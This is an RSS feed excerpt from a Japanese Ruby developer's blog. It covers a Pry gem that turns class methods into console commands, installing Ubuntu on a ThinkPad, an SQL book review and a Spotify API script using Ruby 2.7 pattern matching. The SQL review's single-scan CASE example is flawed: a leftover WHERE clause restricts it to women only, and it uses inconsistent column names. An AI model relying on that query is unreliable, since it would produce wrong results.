&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>-jpでgemを晒したら「&lt;code>pryrc&lt;/code>や&lt;code>irbc&lt;/code>に書くのも手ですがよりチームでコミットしやすいメリットもあるかも。」というお言葉もらいました。&lt;code>pryrc&lt;/code>や&lt;code>irbc&lt;/code>書くのも手ですね。ありがとうございます。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>-jpは本当に神。&lt;a href="#fnref:1" rev="footnote">↩&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/div>
&lt;/body></description></item><item><title>クラスメソッドをPryのコマンドにできるGemをリリースしました</title><link>https://qwyng.dev/posts/2019/07/15/205709/</link><pubDate>Mon, 15 Jul 2019 20:57:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/07/15/205709/</guid><description>&lt;body>
&lt;p>作ったGemはこれです&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Fpry-singular" title="QWYNG/pry-singular" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/pry-singular">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>使い方&lt;/h2>
&lt;p>まず&lt;code>.pryrc&lt;/code>内で下のようにクラスをセットします。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> PrySingular.make_commands HogeJob, FactoryBot
&lt;/pre>
&lt;p>これでPryの中で設定したクラスの特異メソッドをコマンドとして使うことができます。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> pry(main)&amp;gt; perform_now &lt;/pre>
&lt;p>引数を渡すこともできます（あくまでコマンドなので引数との間はスペースが必要）&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> pry(main)&amp;gt; create :user &lt;/pre>
&lt;p>コマンドにしたいメソッドを直接指定することもできます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> PrySingular.make_commands FactoryBot, only: [:build, :attributes_for]
&lt;/pre>
&lt;p>コマンドにしたくないメソッドを指定することもできます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> PrySingular.make_commands FactoryBot, except: :create
&lt;/pre>
&lt;p>コマンドなので&lt;code>Object&lt;/code>を汚してメソッドを生やすことはありません。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> [1] pry(main)&amp;gt; self
=&amp;gt; main
[2] pry(main)&amp;gt; self.respond_to?(:create)
=&amp;gt; false &lt;/pre>
&lt;p>また、内部ではsingleton_methods(true)を使っているので、&lt;code>class&lt;/code>とか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>のコアな部分まではコマンドを設定しません。
&lt;figure class="figure-image figure-image-fotolife" title="超絶怒涛の神issueを立ててくれた@fursichさんありがとうございます！">&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190715/20190715124804.jpg" alt="f:id:sasa5740:20190715124804j:plain" title="f:id:sasa5740:20190715124804j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;figcaption>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C4%B6%C0%E4%C5%DC%C5%F3">超絶怒涛&lt;/a>の神issueとPRを立ててくれた@fursichさんありがとうございます！&lt;a href="#f-9cf6a2ba" name="fn-9cf6a2ba" title="ブログに乗せることも快く了承いただき本当にありがとうございます">*1&lt;/a>&lt;/figcaption>&lt;/figure>&lt;/p>
&lt;h2>作った理由&lt;/h2>
&lt;p>FactoryBotの&lt;code>create&lt;/code>とかActsAsTenantの&lt;code>without_tenant&lt;/code>とかをいちいち&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a> cの中で書くのめんどい〜みたいな話が周りで起こり、.pryrcの話がにわかに盛り上がりました。そのとき職場の人が&lt;code>Pry::ClassCommand&lt;/code>でゴニョゴニョといっていたのを聞いたのが始まりです。&lt;br>
最初はFactoryBotとPryを連携させたいな〜と思って作っていたのですが、書いていくうちに「これクラス設定してもらって全部できるようにしたほうが便利だな」と思って実装してみました。&lt;/p>
&lt;h3>実装&lt;/h3>
&lt;p>コアな部分はここです&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def import_class_command(klass, options)
singular_methods = adapt_options_singleton_methods(klass, options)
set_pry_command do
singular_methods.each do |klass_method|
command "#{klass_method}", "#{klass}.#{klass_method}" do
extend PrySingular::Slop
klass.class_eval &amp;lt;&amp;lt;-EOS
#{parse_singular_method_command(Readline::HISTORY.to_a.last)}
EOS
end
end
end
end
def set_pry_command(&amp;amp;block)
commands = Pry::CommandSet.new &amp;amp;block
Pry.config.commands.import(commands)
end
&lt;/pre>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module PrySingular
module Slop
def parse_singular_method_command(items)
method, args = items.split(" ", 2)
method + ' ' + args.gsub(' ', '')
end
end
end
&lt;/pre>
&lt;p>&lt;code>command&lt;/code>はStringオブジェクトをメソッドの名前、メソッドの説明の順に引数に取って、コマンドが呼ばれたらブロックの中身を実行してくれるPryのメソッドです。&lt;br>
仕組みとしてはコマンドが呼ばれたら&lt;code>Readline::HISTORY&lt;/code>の最新のものを一度メソッドと引数に分けてから引数の空白を削除し、対象のクラスをレシーバーに&lt;code>class_eval&lt;/code>して直接実行しています。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> pry(main)&amp;gt; create :user &lt;/pre>
&lt;p>と呼ばれたら最終的に&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> FactoryBot.class_eval &amp;lt;&amp;lt;-EOS
create :user
EOS
&lt;/pre>
&lt;p>が実行されるといった具合です。
なのでコマンドの実装の中身は全て、クラスにReadlineから受け取った文字列をズルっとわたしているだけです。&lt;/p>
&lt;h2>Gemを作ってみて&lt;/h2>
&lt;p>Gem作成は初めてでしたが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RubyGems">RubyGems&lt;/a>のおかげで簡単に公開することができました。&lt;br>
Pryの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/DSL">DSL&lt;/a>の柔軟性にも助けられましたし、オプションの設定方法も&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>のパクリです。 巨人の肩は高い 。&lt;br>
反省点としてはリリースしてはだめじゃんを繰り返して既にversionが0.1.7なことですね…&lt;br>
まだまだテストも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8">カバレッジ&lt;/a>足りないしリファクタもできると思うし、そもそもまだバグもあるかもしれないので、よいGemにできるようやっていきです。&lt;br>
よかったら使ってみてください、バグとかこれがあったら面白いとかあればissueやコメントで教えてくれたら泣いて喜びます。&lt;/p>
&lt;h2>2019/07/21　追記&lt;/h2>
&lt;p>インターフェースをmake_commandsにしたり内部のコードいろいろかえました&lt;/p>
&lt;div class="footnote">
&lt;p class="footnote">&lt;a href="#fn-9cf6a2ba" name="f-9cf6a2ba" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">ブログに乗せることも快く了承いただき本当にありがとうございます&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>個人開発用マシンをThinkPad X1 Carbon with Ubuntuにしました</title><link>https://qwyng.dev/posts/2019/07/08/083000/</link><pubDate>Mon, 08 Jul 2019 08:30:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/07/08/083000/</guid><description>&lt;body>
&lt;h2>経緯&lt;/h2>
&lt;p>個人の開発マシンはプログラミング始めた去年の6月にMBP2014の13インチを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E4%A5%D5%A5%AA%A5%AF">ヤフオク&lt;/a>で落札して以来ずっとそれを使っていたのですが、5月末くらいにコーヒーを盛大にこぼして&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%C3%A5%AF%A5%D1%A5%C3%A5%C9">トラックパッド&lt;/a>が使用&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C9%D4%C7%BD">不能&lt;/a>に…。&lt;br>
最新のMBPの13インチか迷ったけど&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>使ってみたかったので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a> x1 Carbonに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>入れて使うことにしました。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a> x1 Carbonにした理由は&lt;/p>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>を入れている報告が多数あること&lt;/li>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a>かっこいいという勝手なイメージ&lt;/li>
&lt;li>コーヒーとか多少こぼしても大丈夫な堅牢性&lt;br>
(この動画最高&lt;a href="https://www.youtube.com/watch?v=0kJios8N3RE">ThinkPad - 史上最強の証明テスト - YouTube&lt;/a>)&lt;/li>
&lt;/ul>
&lt;p>です。いろいろいれたら17万くらいになっちゃいました。&lt;/p>
&lt;h2>スペック&lt;/h2>
&lt;ul>
&lt;li>Coffee Lake &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Core%20i7">Core i7&lt;/a>-8550U&lt;/li>
&lt;li>16GB RAM&lt;/li>
&lt;li>14.0型WQHD液晶&lt;/li>
&lt;li>M.2 SSD180 (ぶっちゃけ200もいらないので減らした）&lt;/li>
&lt;li>英字キーボード&lt;/li>
&lt;/ul>
&lt;p>こうみるとそんなに盛ってないですね&lt;/p>
&lt;h2>ふぁーすと・いんぷれっしょん&lt;/h2>
&lt;p>&lt;figure class="figure-image figure-image-fotolife" title="ロゴがかっこいい">&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190708/20190708001839.jpg" alt="f:id:sasa5740:20190708001839j:plain" title="f:id:sasa5740:20190708001839j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;figcaption>ロゴがかっこいい&lt;/figcaption>&lt;/figure>カーボンの天板の高級感と手触りは◎。キーボードも噂に違わぬ押しやすさです。 そしてなんといっても軽量です。前回のMBP2014が13インチが1.57 kg、職場のMBP2017の15インチが1.83kg。比較して&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a> X1 Carbon G6は1.13kg。持つとわかりますが本当に軽いです。あと端子がまとも&lt;br>
スピーカーが背面にあるのだけ悲しい&lt;/p>
&lt;h2>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>入れてみて&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a>に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>ってポピュラーな使い方だし大丈夫だろ〜と思ってたのですが結構苦労しました…&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%C3%A5%AF%A5%D1%A5%C3%A5%C9">トラックパッド&lt;/a>と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%C3%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8">トラックポイント&lt;/a>（赤ポチ）が反応せず、ググりまくって色々試してもどこか治るとどこか動かなくなる状態で途方にくれていました。&lt;br>
結局18.04から19.04にアップデートしたら治ったので良くわからない。
18.04でも使いたいって人がいたらこれをいれるのがいいかと思います。
&lt;a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1791427/comments/94">https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1791427/comments/94&lt;/a>&lt;br>
スリープ状態でもバッテリーがガンガン消費される問題もありました。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/BIOS">BIOS&lt;/a>で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>用の設定に変えれば解決しますが。&lt;br>
現在も&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/bluetooth">bluetooth&lt;/a>の音質がかなり悪く、なんとかならんかと試行錯誤しています。&lt;/p>
&lt;h2>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Mac">Mac&lt;/a>との違い&lt;/h2>
&lt;p>そんなにないです。⌘キーって便利だったんだなぁというくらい。
tweak tool入れてaltをctrにするといい感じ。現状はかなり快適です。&lt;br>
Dockerいれるのに19.04だと公式通りにやってもうまく行かなくてちょっとハマりましたが、Dockerそのものは明らかに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Mac">Mac&lt;/a>より軽いです。キビキビ。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EF%A1%BC%A5%AF%A5%B9%A5%DA%A1%BC%A5%B9">ワークスペース&lt;/a>やウインドウの管理なんかも楽ですしスムーズです。&lt;br>
とりあえず入れて正常に動くことを確認したもの&lt;/p>
&lt;ul>
&lt;li>rbenv及び&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>
&lt;/li>
&lt;li>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/chrome">chrome&lt;/a>&lt;/li>
&lt;li>rubymine&lt;/li>
&lt;li>Simplenote&lt;/li>
&lt;li>copyq&lt;/li>
&lt;li>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Spotify">Spotify&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/chrome">chrome&lt;/a>入れれば環境はほとんど同期したも同然だし、シェルもfish使ってるのでチョチョっと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%E9%A5%B0%A5%A4%A5%F3">プラグイン&lt;/a>入れるだけですみました。
今はlinuxbrewもあるのでこれからも困ることはそんなにないかと思います。
&lt;figure class="figure-image figure-image-fotolife" title="テーマもデフォルトでいい感じだと思います">&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190708/20190708002905.png" alt="f:id:sasa5740:20190708002905p:plain" title="f:id:sasa5740:20190708002905p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;figcaption>テーマもデフォルトで十分いい感じだと思います&lt;/figcaption>&lt;/figure>&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>やっぱり黒一色っていいですね。秋葉に黒い人が多いのもしょうがない。&lt;br>
「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>のしくみ」とかこれを使って実践しながら読んでいきたいと思います。&lt;br>
後いざ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a>で競プロや！ってABCでたらB以降さっぱりできなくて泣いた。&lt;/p>
&lt;/body></description></item><item><title>SQL実践入門を読みました</title><link>https://qwyng.dev/posts/2019/06/19/232907/</link><pubDate>Wed, 19 Jun 2019 23:29:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/06/19/232907/</guid><description>&lt;body>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4774173010/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51Oeo4yOp-L._SL160_.jpg" class="hatena-asin-detail-image" alt="SQL実践入門──高速でわかりやすいクエリの書き方 (WEB+DB PRESS plus)" title="SQL実践入門──高速でわかりやすいクエリの書き方 (WEB+DB PRESS plus)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4774173010/hatena-blog-22/">SQL実践入門──高速でわかりやすいクエリの書き方 (WEB+DB PRESS plus)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> ミック&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2015/04/11&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/4774173010/hatena-blog-22" target="_blank">この商品を含むブログ (7件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>や失敗から学ぶ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>の正しい歩き方を読んでいて、ウインドウ関数や結合などまだまだ浅い理解だなーと思って買いました。&lt;br>
以下、気になったことと感想を書きます。&lt;/p>
&lt;h4>where句で条件分岐するのは素人、プロはSELECT句で条件分岐する。&lt;/h4>
&lt;p>どういうことかというと　例えば
名前、性別、部署を持つテーブルがあったとして&lt;/p>
&lt;p>社員名簿テーブル&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名前&lt;/th>
&lt;th>性別&lt;/th>
&lt;th>部署&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>太郎&lt;/td>
&lt;td>男&lt;/td>
&lt;td>営業&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>花子&lt;/td>
&lt;td>女&lt;/td>
&lt;td>営業&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>男性と女性人数を部署ごとに出したいとき
whereを使うと&lt;/p>
&lt;pre class="code lang-sql" data-lang="sql" data-unlink> SELECT 部署,
COUNT(*)
FROM 社員名簿
WHERE 性別= '男'
GROUP BY 部署;
SELECT 部署,
COUNT(*)
FROM 社員名簿
WHERE 性別= '女'
GROUP BY 部署;
&lt;/pre>
&lt;p>という感じでUNION使っても二回テーブルスキャンしなくてはいけないところを&lt;/p>
&lt;pre class="code lang-sql" data-lang="sql" data-unlink> SELECT 部署,
SUM( CASE WHEN sex = '男' THEN 1 ELSE 0 END),
SUM( CASE WHEN sex = '女' THEN 1 ELSE 0 END)
FROM 社員名簿
WHERE 性別= '女'
GROUP BY 部署;
&lt;/pre>
&lt;p>というように書くことができます
CASE式はWHENに当てはまればそこで評価を終了するので先程のWHERE句での分岐より処理も早いです。&lt;/p>
&lt;h4>Joinの際に駆動表はなぜ小さくするのか&lt;/h4>
&lt;p>ネステッドループで結合する際に、駆動表はフルテーブルスキャンが行われますが内部表はインデックスが使われます。&lt;br>
どうせフルテーブルスキャンするなら小さいほうが良いし、大きなテーブルスキャンするならインデックス使ったほうが良いので、駆動表は小さいほうがいいんですね。&lt;br>
ハッシュで結合するのは結合するテーブルが同じくらい大きいサイズのときにも有効ですが、メモリを大量に消費するので注意ともありました。&lt;/p>
&lt;h4>ぐるぐる系とガツン系&lt;/h4>
&lt;p>ぐるぐる系というのはいわゆる繰り返し処理（ループ）のことです。
一行ずつレコードを引っ張ってきて簡単な処理する、という行為のことですね。&lt;br>
対してガツン系はCASEやウインドウ関数等を駆使して処理を一回で記述してしまうことです。 &lt;br>
シンプルで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%F3%A5%B6%A5%AF%A5%B7%A5%E7%A5%F3">トランザクション&lt;/a>の制御が容易だが、チューニングしにくくパフォーマンスもでにくいぐるぐる系と、チューニングしやすくパフォーマンスもでやすいが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%F3%A5%B6%A5%AF%A5%B7%A5%E7%A5%F3">トランザクション&lt;/a>の制御や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D7%A5%C6%A5%A3%A5%DE">オプティマ&lt;/a>イザに委ねる部分が大きいガツン系か、その&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%EC%A1%BC%A5%C9%A5%AA%A5%D5">トレードオフ&lt;/a>を認識する必要があるとのことです。&lt;br>
もともと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>はループをできるだけ排除したい、という思想の元で生まれたそうで、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BC%EA%C2%B3%A4%AD%B7%BF%B8%C0%B8%EC">手続き型言語&lt;/a>になれている人ほど処理を全部自分で書いてループさせがちなので、ガツン系のメリットをしっかり知っておくのが重要です。&lt;/p>
&lt;h3>インデックスが使えないとき、役にたたない時&lt;/h3>
&lt;p>「失敗から学ぶ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>の正しい歩き方」のありましたが、&lt;/p>
&lt;ul>
&lt;li>&lt;p>IS NULL&lt;/p>&lt;/li>
&lt;li>&lt;p>列に直接演算&lt;/p>&lt;/li>
&lt;/ul>
&lt;p>これらで検索するときはインデックスが使えません。&lt;br>
なぜかというと、インデックスの中に存在する値はあくまでそのセルの中にある値であって、演算後の値でも、NULLでもないからです。&lt;br>
選択率が高い（取り出すレコードがテーブル全体に対して割合が高い）ときも要注意です。&lt;/p>
&lt;h3>感想&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>の当たり前に使われている用語に対して説明、考え方が乗っている良書でした。&lt;br>
ウインドウ関数や結合についてはなんとなくで使っていることが多かったので、クロス結合やパーティショニングのカットのイメージから説明してくれる本書はありがたかったです。
また全体を通して&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%EC%A1%BC%A5%C9%A5%AA%A5%D5">トレードオフ&lt;/a>というものを意識して書かれてあるとも感じました。&lt;br>
それぞれの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>や手法にメリットデメリットが書かれていて、それを把握した上で活用するのが大事だということが繰り返し述べられていた印象です。&lt;/p>
&lt;/body></description></item><item><title>SpotifyAPIとRuby2.7の新機能パターンマッチングで人気のある曲だけをフリーワードから検索して出力するスクリプトを書いた</title><link>https://qwyng.dev/posts/2019/05/23/005144/</link><pubDate>Thu, 23 May 2019 00:51:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/05/23/005144/</guid><description>&lt;body>
&lt;p>Rubykaigi2019にてパターンマッチングについての発表がありました。&lt;/p>
&lt;p>&lt;iframe id="talk_frame_510928" src="//speakerdeck.com/player/a853a73bba9d48ae88860f7c9b068334" width="710" height="399" style="border:0; padding:0; margin:0; background:transparent;" frameborder="0" allowtransparency="true" allowfullscreen="allowfullscreen" mozallowfullscreen="true" webkitallowfullscreen="true">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://speakerdeck.com/k_tsj/pattern-matching-new-feature-in-ruby-2-dot-7">speakerdeck.com&lt;/a>&lt;/cite>
スライドにもある通り&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/API">API&lt;/a>からもらった&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JSON">JSON&lt;/a>を扱うのに便利と感じました。&lt;br>
そこで実際に解析する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8">スクリプト&lt;/a>を書いてみたのがこちら。
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2FEchoes" title="QWYNG/Echoes" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/Echoes">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>スタンドの名前つけるの楽しいしモチベ上がるのでおすすめです。&lt;/p>
&lt;h2>Echoesのやること&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Spotify">Spotify&lt;/a>は内部で曲やアーティストにpopularityというスコアを１００点満点でつけています。&lt;br>
Echoesはフリーワードで公開されているplaylistを検索して、その中に含まれているpopularityが９０点以上のスコアを持ってる曲を出力してくれます。&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190522/20190522223424.gif" alt="f:id:sasa5740:20190522223424g:plain" title="f:id:sasa5740:20190522223424g:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
SpotifyAPIで提供されている検索機能を利用しています。&lt;br>
入力されたワードで検索して、受け取った&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Json">Json&lt;/a>形式のレスポンスをパターンマッチングを使って解析しています。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> playlists.each do |playlist|
tracks = spotify_client.get_tracks_from_playlist(playlist)
tracks[:items].each do |item|
100.downto(90).each do |popularity|
case item
in { track: { name: name, popularity: ^popularity } }
result[name] = popularity
else
next
end
end
end
end
&lt;/pre>
&lt;p>具体的にパターンマッチング使ってるのはこの部分&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> 100.downto(90).each do |popularity|
case item
in { track: { name: name, popularity: ^popularity } }
result[name] = popularity
else
next
end
end
&lt;/pre>
&lt;p>&lt;code>^popularity&lt;/code>の部分は既に定義されている変数をパターンマッチに使いたいときに使う記法です。今回は100から90までのInteger&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>を突っ込んでます。&lt;br>
elseも書かないとNoMatchingPatternErrorという例外が起きてしまうので注意。（このErrorいい感じになってほしい）&lt;br>
スコアがpopularity点だった場合にresultハッシュに突っ込んでいくことをやっているのですが、パターンマッチングを使うと変数に値を格納するのも直感的にかけます。&lt;br>
これがパターンマッチング使わないと&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> 100.downto(91).each do |popularity|
if item[:track][:popularity] == popularity
name = item[:track][:name]
result[name] = popularity
end
end
&lt;/pre>
&lt;p>という感じになります。今回はそれほどでもないですが、条件追加するごとにどんどん条件分岐が深くなっていくやつですね。&lt;/p>
&lt;h2>終わりに&lt;/h2>
&lt;p>パターンマッチングを使うと条件分岐もパターンでシンプルに設定し、かつ変数に値も入れてくれます。&lt;br>
こんな感じの単純な使い方以外にもクラスに構造を追加してパターンマッチングしたり色々遊べそうです。&lt;br>
実際遊んでる記事を上げておきます。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Ftech.medpeer.co.jp%2Fentry%2F2019%2F05%2F13%2F090000" title="Ruby2.7の(実験的)新機能「パターンマッチ」で遊ぶ - メドピア開発者ブログ" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://tech.medpeer.co.jp/entry/2019/05/13/090000">tech.medpeer.co.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fdeveloper.feedforce.jp%2Fentry%2F2019%2F05%2F17%2F110000" title="Ruby 2.7 で導入予定のパターンマッチングを試したら無限大の可能性を感じた話 - Feedforce Developer Blog" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://developer.feedforce.jp/entry/2019/05/17/110000">developer.feedforce.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a> 2.7 楽しみですね&lt;/p>
&lt;h2>追記&lt;/h2>
&lt;p>@k_tsjさんにこう書くといいよアド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D0%A5%A4%A5%B9">バイス&lt;/a>いただきました。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> playlists.each do |playlist|
tracks = spotify_client.get_tracks_from_playlist(playlist)
tracks[:items].each do |item|
case item
in { track: { name: name, popularity: 90..100 =&amp;gt; popularity } }
result[name] = popularity
else
next
end
end
end
&lt;/pre>
&lt;p>rangeオブジェクトとASパターンを組み合わせるともっとわかりやすい:eye:
すごいクールになりました。ありがとう御座います。&lt;/p>
&lt;/body></description></item><item><title>プロになるためのWeb技術入門を読みました　O/Rマッピングフレームワークの目的</title><link>https://qwyng.dev/posts/2019/05/14/233736/</link><pubDate>Tue, 14 May 2019 23:37:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/05/14/233736/</guid><description>&lt;body>
